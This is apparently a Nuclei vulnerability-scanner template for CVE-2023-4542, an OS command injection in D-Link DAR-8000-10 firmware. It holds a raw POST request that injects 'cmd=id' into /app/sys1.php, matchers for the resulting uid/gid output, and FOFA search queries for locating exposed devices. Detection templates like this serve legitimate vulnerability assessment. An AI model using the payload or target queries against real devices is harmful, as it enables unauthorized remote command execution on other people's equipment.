http:
- matchers:
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /app/sys1.php HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded


    cmd=id

    '
id: CVE-2023-4542
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:o:dlink:dar-8000-10_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-4542
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.9884
    epss-score: 0.90977
  description: 'D-Link DAR-8000-10 version has an operating system command injection
    vulnerability. The vulnerability originates from the parameter id of the file
    /app/sys1.php which can lead to operating system command injection.

    '
  metadata:
    fofa-query:
    - body="DAR-8000-10" && title="D-Link"
    - body="dar-8000-10" && title="d-link"
    max-request: 1
    product: dar-8000-10_firmware
    vendor: dlink
    verified: true
  name: D-Link DAR-8000-10 - Command Injection
  reference:
  - https://github.com/20142995/sectool
  - https://github.com/tanjiti/sec_profile
  - https://github.com/wy876/POC/blob/main/D-Link_DAR-8000%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2023-4542).md
  - https://vuldb.com/?ctiid.238047
  - https://vuldb.com/?id.238047
  severity: critical
  tags: cve,cve2023,dlink
